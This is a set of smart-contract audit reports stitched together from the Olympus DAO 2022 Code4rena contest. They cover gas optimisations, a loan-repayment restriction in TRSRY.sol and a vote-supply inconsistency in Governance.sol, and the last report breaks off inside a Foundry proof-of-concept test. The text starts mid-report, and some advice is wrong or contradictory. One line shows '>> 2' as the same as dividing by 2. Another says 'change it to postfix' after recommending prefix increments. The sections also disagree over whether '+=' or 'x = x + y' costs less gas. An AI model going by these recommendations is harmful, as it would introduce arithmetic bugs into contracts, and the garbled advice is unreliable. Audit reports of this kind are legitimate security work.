(proposalHasBeenActivated[proposalId_] == true) {  233:     proposalHasBeenActivated[proposalId_] = true;  252:      yesVotesForProposal[activeProposal.proposalId] += userVotes;  266:       uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] -  254:      noVotesForProposal[activeProposal.proposalId] += userVotes;  267:      noVotesForProposal[activeProposal.proposalId];  247:      if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {  257:       userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;  296:       uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];  306:       if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {  310:        tokenClaimsForProposal[proposalId_][msg.sender] = true;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L168](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L168)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L206](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L206)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L217](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L217)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L193](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L193)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L233](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L233)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L266)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L267](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L267)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L257](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L257)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L296](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L296)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L310](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L310)   [9]  <X> += <Y> COSTS MORE GAS THAN <X> = <X> + <Y> FOR STATE VARIABLES  *There are 6 instances of this issue:*  ``` File: 2022-08-olympus/src/modules/TRSRY.sol  96:  reserveDebt[token_][msg.sender] += amount_;  97:   totalDebt[token_] += amount_;   131:   if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96-L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96-L97)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131)   ```  File: 2022-08-olympus/src/modules/PRICE.sol   136:   _movingAverage += (currentPrice - earliestPrice) / numObs;  138:     _movingAverage -= (earliestPrice - currentPrice) / numObs;  ```   [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138)   ```  File: 2022-08-olympus/src/policies/Heart.sol  103: lastBeat += frequency();  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103)   [10] CHEAPER TO SPLIT STRUCT IF ONLY PART OF IT IS UPDATED FREQUENTLY  The proposalId field is updated frequently so it should be in a separate struct rather than re-writing the whole struct every time  *There is 1 instance of this issue:*   ```   File: 2022-08-olympus/src/policies/Governance.sol  167:  uint256 proposalId = INSTR.store(instructions_);   ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L167](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L167)   [11]  AMOUNTS SHOULD BE CHECKED FOR 0 BEFORE CALLING A TRANSFER  Checking non-zero transfer values can avoid an expensive external call and save gas.  I suggest adding a non-zero-value check here:  *There are 8 instances of this issue:*    ```  File: 2022-08-olympus/src/policies/Heart.sol  111:   function _issueReward(address to_) internal { 112:   rewardToken.safeTransfer(to_, reward); 113:    emit RewardIssued(to_, reward);  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L111-L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L111-L113)  ``` File: 2022-08-olympus/src/policies/BondCallback.sol  124:    payoutToken.safeTransfer(msg.sender, outputAmount_);  159:      token.safeTransfer(address(TRSRY), balance);  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L124)   [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L159](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L159)   ```  File: 2022-08-olympus/src/modules/TRSRY.sol   82:  token_.safeTransfer(to_, amount_);  99:  token_.safeTransfer(msg.sender, amount_);  110:   token_.safeTransferFrom(msg.sender, address(this), amount_);   ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L82](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L82)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110)                                                                          
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L104-L119   # Vulnerability details  ### TRSRY.sol alows only loan owner to repay loan  It should be allowed that that everyone can repay the loan. There could be a situation that loan owner is not able to repay the loan but a different address could repay in his place. It seems as unnecessary restriction that only the owner can repay his loan.  **Recommendation**: Allow everyone to repay any loan. Context: [`TRSRY.sol#L104-L119`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L104-L119) ```diff= -    function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { -        if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();          // Deposit from caller first (to handle nonstandard token transfers)         uint256 prevBalance = token_.balanceOf(address(this));         token_.safeTransferFrom(msg.sender, address(this), amount_);          uint256 received = token_.balanceOf(address(this)) - prevBalance;          // Subtract debt from caller -        reserveDebt[token_][msg.sender] -= received;         totalDebt[token_] -= received;  -        emit DebtRepaid(token_, msg.sender, received);     } ```
## Table of Contents Total of 11 Issues Found. - Storage Variables can be Packed into Fewer Storage Slots - Unchanging State Variable Should be Immutable - Change Function Visibility Public to External - Internal Function Called Only Once can be Inlined - Use Bit Shifting Instead of Multiplication/Division of 2 - Use Calldata instead of Memory for Read Only Function Parameters - Boolean Comparisons - Using Elements Smaller than 32 bytes (256 bits) Might Use More Gas - Unnecessary Default Value Initialization - Store Array's Length as a Variable - ++i Costs Less Gas than i++  &ensp; ### Storage Variables can be Packed into Fewer Storage Slots  #### Issue The order of storage variables can be reordered in a way to reduce the usage amount of storage slots. ``` Reference from solidity documentation: Finally, in order to allow the EVM to optimize for this, ensure that you try to order your storage  variables and struct members such that they can be packed tightly. For example, declaring your  storage variables in the order of uint128, uint128, uint256 instead of uint128, uint256, uint128,  as the former will only take up two slots of storage whereas the latter will take up three. ``` https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html#layout-of-state-variables-in-storage  #### PoC Total of 1 instance found.  1. OlympusHeart Contract We can save 1 storage slot by reordering it like below. Move bool variable (1 byte size) to pack it with address variable (20 bytes size).  Before: https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48  Change to: ```solidity     /// @notice Timestamp of the last beat (UTC, in seconds)     uint256 public lastBeat;      /// @notice Reward for beating the Heart (in reward token decimals)     uint256 public reward;      /// @notice Reward token address that users are sent for beating the Heart     ERC20 public rewardToken;      /// @notice Status of the Heart, false = stopped, true = beating     bool public active;      // Modules     OlympusPrice internal PRICE;      // Policies     IOperator internal _operator; ```  #### Mitigation Reorder storage variables like shown in above PoC.  &ensp; ### Unchanging State Variable Should be Immutable  #### Issue State variable that is only set in the constructor and can't be changed afterwards, should be declared as immutable.  #### PoC Total of 2 instances found.  1. ohm variable of BondCallback.sol https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L32  2. aggregator variable of BondCallback.sol https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L28  #### Mitigation Change to immutable.  &ensp; ### Change Function Visibility Public to External  #### Issue If the function is not called internally, it is cheaper to set your function visibility to external instead of public.  #### PoC Total of 4 instances found.  1. Governance.sol:getMetadata() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L145  2. Governance.sol:getActiveProposal() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L151  3. Kernel.sol:grantRole() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L439  4. Kernel.sol:revokeRole() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L451   #### Mitigation Change the function visibility to external.  &ensp; ### Internal Function Called Only Once Can be Inlined  #### Issue Certain function is defined even though it is called only once. Inline it instead to where it is called to avoid usage of extra gas.  #### PoC Total of 9 instances found.  1. _issueReward() of Heart.sol this function called only once at line 106 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111-L114 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106  2. _addObservation() of Operator.sol this function called only once at line 201 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L652-L695 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L201  3. _installModule() of Kernel.sol this function called only once at line 239 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L266-L277 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L239  4. _upgradeModule() of Kernel.sol this function called only once at line 243 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L279-L293 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L243  5. _activatePolicy() of Kernel.sol this function called only once at line 246 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L295-L315 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L246  6. _deactivatePolicy() of Kernel.sol this function called only once at line 249 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L325-L346 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L249  7. _migrateKernel() of Kernel.sol this function called only once at line 256 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L351-L372 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L256  8. _reconfigurePolicies() of Kernel.sol this function called only once at line 292 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L378-L389 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L292  9. _pruneFromDependents() of Kernel.sol this function called only once at line 342 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L409-L432 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L342  #### Mitigation I recommend to not define above functions and instead inline it at place it is called.  &ensp; ### Use Bit Shifting Instead of Multiplication/Division of 2  #### Issue The MUL and DIV opcodes cost 5 gas but SHL and SHR only costs 3 gas. Since MUL/DIV and SHL/SHR result the same, use cheaper bit shifting.  #### PoC Total of 5 instances found. ```solidity ./Operator.sol:372:            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); ./Operator.sol:427:            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); ./Operator.sol:419:            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; ./Operator.sol:420:            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; ./Operator.sol:786:                ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ```  #### Mitigation Use bit shifting instead of multiplication/division. Example: ```solidity uint256 center = upper - (upper - lower) / 2;  Good: uint256 center = upper - (upper - lower) >> 2;  ```  &ensp; ### Use Calldata instead of Memory for Read Only Function Parameters  #### Issue It is cheaper gas to use calldata than memory if the function parameter is read only. Calldata is a non-modifiable, non-persistent area where function arguments are stored,  and behaves mostly like memory. More details on following link. link: https://docs.soliditylang.org/en/v0.8.15/types.html#data-location  #### PoC Total of 4 instances found. ``` ./Governance.sol:162:        string memory proposalURI_ ./PRICE.sol:205:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) ./TreasuryCustodian.sol:53:    function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external { ./BondCallback.sol:152:    function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") { ```  #### Mitigation Change memory to calldata  &ensp; ### Boolean Comparisons  #### Issue It is more gas expensive to compare boolean with "variable == true" or "variable == false" than  directly checking the returned boolean value.  #### PoC Total of 2 instances found.  ``` ./Governance.sol:223:        if (proposalHasBeenActivated[proposalId_] == true) { ./Governance.sol:306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  #### Mitigation Simply check by returned boolean value. Change it to ``` if (proposalHasBeenActivated[proposalId_]) ```  &ensp; ### Using Elements Smaller than 32 bytes (256 bits) Might Use More Gas  #### Issue Since EVM operates on 32 bytes at a time, if the element is smaller than that, the EVM must use more operations in order to reduce the elements from 32 bytes to specified size.  Reference: https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html  #### PoC Total of 42 instances found. ``` ./PriceConfig.sol:58:    function changeMovingAverageDuration(uint48 movingAverageDuration_) ./PriceConfig.sol:69:    function changeObservationFrequency(uint48 observationFrequency_) ./IOperator.sol:85:    function setCushionFactor(uint32 cushionFactor_) external; ./IOperator.sol:93:        uint32 duration_, ./IOperator.sol:94:        uint32 debtBuffer_, ./IOperator.sol:95:        uint32 depositInterval_ ./IOperator.sol:101:    function setReserveFactor(uint32 reserveFactor_) external; ./IOperator.sol:110:        uint32 wait_, ./IOperator.sol:111:        uint32 threshold_, ./IOperator.sol:112:        uint32 observe_ ./TRSRY.sol:51:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./VOTES.sol:27:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./MINTR.sol:25:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./PRICE.sol:27:    event MovingAverageDurationChanged(uint48 movingAverageDuration_); ./PRICE.sol:28:    event ObservationFrequencyChanged(uint48 observationFrequency_); ./PRICE.sol:75:        uint48 observationFrequency_, ./PRICE.sol:76:        uint48 movingAverageDuration_ ./PRICE.sol:84:        uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals(); ./PRICE.sol:87:        uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals(); ./PRICE.sol:113:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./PRICE.sol:127:        uint32 numObs = numObservations; ./PRICE.sol:185:        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1; ./PRICE.sol:240:    function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned { ./PRICE.sol:266:    function changeObservationFrequency(uint48 observationFrequency_) external permissioned { ./Operator.sol:51:    event CushionFactorChanged(uint32 cushionFactor_); ./Operator.sol:52:    event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_); ./Operator.sol:53:    event ReserveFactorChanged(uint32 reserveFactor_); ./Operator.sol:54:    event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_); ./Operator.sol:97:        uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve] ./Operator.sol:418:            uint8 oracleDecimals = PRICE.decimals(); ./Operator.sol:516:    function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") { ./Operator.sol:528:        uint32 duration_, ./Operator.sol:529:        uint32 debtBuffer_, ./Operator.sol:530:        uint32 depositInterval_ ./Operator.sol:548:    function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") { ./Operator.sol:560:        uint32 wait_, ./Operator.sol:561:        uint32 threshold_, ./Operator.sol:562:        uint32 observe_ ./Operator.sol:665:        uint32 observe = _config.regenObserve; ./INSTR.sol:28:    function VERSION() public pure override returns (uint8 major, uint8 minor) { ./Kernel.sol:100:    function VERSION() external pure virtual returns (uint8 major, uint8 minor) {} ./RANGE.sol:115:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ```  #### Mitigation I suggest using uint256 instead of anything smaller or downcast where needed.  &ensp; ### Unnecessary Default Value Initialization  #### Issue When variable is not initialized, it will have its default values. For example, 0 for uint, false for bool and address(0) for address. Reference: https://docs.soliditylang.org/en/v0.8.15/control-structures.html#scoping-and-declarations  #### PoC Total of 3 instances found. ``` ./KernelUtils.sol:43:    for (uint256 i = 0; i < 5; ) { ./KernelUtils.sol:58:    for (uint256 i = 0; i < 32; ) { ./Kernel.sol:397:        for (uint256 i = 0; i < reqLength; ) { ```  #### Mitigation I suggest removing default value initialization. For example, - for (uint256 i; i < 5; ) {  &ensp; ### Store Array's Length as a Variable   #### Issue By storing an array's length as a variable before the for-loop, can save 3 gas per iteration.  #### PoC Total of 1 instance found. ``` ./Governance.sol:278:        for (uint256 step; step < instructions.length; ) { ```  #### Mitigation Store array's length as a variable before looping it. For example, I suggest changing it to ``` uint256 length = instructions.length; for (uint256 step; step < length; ) { ```  &ensp; ### ++i Costs Less Gas than i++  #### Issue Prefix increments/decrements (++i or --i) costs cheaper gas than  postfix increment/decrements (i++ or i--).  #### PoC Total of 7 instances found. ``` ./KernelUtils.sol:49:            i++; ./KernelUtils.sol:64:            i++; ./Operator.sol:488:            decimals++; ./Operator.sol:670:                _status.low.count++; ./Operator.sol:686:                _status.high.count++; ./Operator.sol:675:                _status.low.count--; ./Operator.sol:691:                _status.high.count--; ```  #### Mitigation Change it to postfix increments/decrements. It saves 6 gas per loop.  &ensp;
 # PREFIX INCREMENTS   IMPACT   Prefix increments are cheaper than postfix increments.    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L49    i++;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L64    i++;   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L488    decimals++;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L670    _status.low.count++;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L686    _status.high.count++;  Mitigation:   replace foo++ to ++foo    # DEFAULT VALUE INITIALIZATION   IMPACT    If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.     Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/Kernel.sol#L397    for (uint256 i = 0; i < reqLength; ) {   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L43    for (uint256 i = 0; i < 5; ) {        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L58    for (uint256 i = 0; i < 32; ) {        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L574    _status.high.count = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L575    _status.high.nextObservation = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L578    _status.low.count = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L579    _status.low.nextObservation = 0;   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L254    _movingAverage = 0;   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L286    _movingAverage = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/RANGE.sol#L135    _range.high.active = false;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/RANGE.sol#L147    _range.low.active = false;        Mitigation:   Remove explicit value initialization.     # COMPARISON OPERATORS   IMPACT    In the EVM, there is no opcode for >= or <=. When using greater than or equal, two operations are performed: > and =.    Using strict comparison operators hence saves gas.        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L210    uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L211    _status.high.count >= config_.regenThreshold    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L216    uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L217    _status.low.count >= config_.regenThreshold    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L486    while (price_ >= 10) {    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L667    if (currentPrice >= movingAverage) {    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L683    if (currentPrice <= movingAverage) {    Mitigation:   Replace <= with <, and >= with >. Do not forget to increment/decrement the compared variable        # COMPARISON WITH ZERO   IMPACT    >0 is less gas efficient than !0 if you enable the optimizer at 10k AND you’re in a require statement. Detailed explanation with the opcodes [here](https://twitter.com/gzeon/status/1485428085885640706)   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L247    if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {    Mitigation:    Replace >0 with !0    # Increment/decrement operations   IMPACT     X = X + Y IS CHEAPER THAN X += Y     X = X- Y IS CHEAPER THAN X -= Y     Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L194    totalEndorsementsForProposal[proposalId_] -= previousEndorsement;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L198    totalEndorsementsForProposal[proposalId_] += userVotes;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L252    yesVotesForProposal[activeProposal.proposalId] += userVotes;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L254    noVotesForProposal[activeProposal.proposalId] += userVotes;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Heart.sol#L103    lastBeat += frequency();    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/BondCallback.sol#L143    _amountsPerMarket[id_][0] += inputAmount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/BondCallback.sol#L144    _amountsPerMarket[id_][1] += outputAmount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L96    reserveDebt[token_][msg.sender] += amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L97    totalDebt[token_] += amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L115    reserveDebt[token_][msg.sender] -= received;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L116    totalDebt[token_] -= received;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L131    if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L132    else totalDebt[token_] -= oldDebt - amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/VOTES.sol#L56    balanceOf[from_] -= amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/VOTES.sol#L58    balanceOf[to_] += amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L136    _movingAverage += (currentPrice - earliestPrice) / numObs;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L138    _movingAverage -= (earliestPrice - currentPrice) / numObs;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L222    total += startObservations_[i];    Mitigation:    X += Y replace with X = X + Y    X -= Y replace with X = X - Y     
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56   # Vulnerability details  ## Impact A user can call the following `vote` function to vote for a proposal. During voting, the voter admin can still call the `issueVotesTo` and `revokeVotesFrom` functions below to issue new votes or revoke old votes for the user, which also changes the votes' total supply during the overall voting. Because each user can only call `vote` once for a proposal due to the `userVotesForProposal[activeProposal.proposalId][msg.sender] > 0` conditional check, the old voted votes, resulted from the `vote` call by the user, will be used to compare against the new total supply of the votes, resulted from the `issueVotesTo` and `revokeVotesFrom` calls during the overall voting, when determining whether the proposal can be executed or not. Because of this inconsistency, the result on whether the proposal can be executed might not be reliable.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 ```solidity     function vote(bool for_) external {         uint256 userVotes = VOTES.balanceOf(msg.sender);          if (activeProposal.proposalId == 0) {             revert NoActiveProposalDetected();         }          if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {             revert UserAlreadyVoted();         }          if (for_) {             yesVotesForProposal[activeProposal.proposalId] += userVotes;         } else {             noVotesForProposal[activeProposal.proposalId] += userVotes;         }          userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;          VOTES.transferFrom(msg.sender, address(this), userVotes);          emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48 ```solidity     function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") {         // Issue the votes in the VOTES module         VOTES.mintTo(wallet_, amount_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56 ```solidity     function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") {         // Revoke the votes in the VOTES module         VOTES.burnFrom(wallet_, amount_);     } ```  ## Proof of Concept Please add the following code in `src\test\policies\Governance.t.sol`.  First, please add the following code for `stdError`. ```solidity import {Test, stdError} from "forge-std/Test.sol";    // @audit import stdError for testing purpose ```  Then, please append the following tests. These tests will pass to demonstrate the described scenarios. ```solidity     function testScenario_UserCannotVoteAgainWithNewlyMintedVotes() public {         _createActiveProposal();          // voter3 votes for the proposal         vm.prank(voter3);         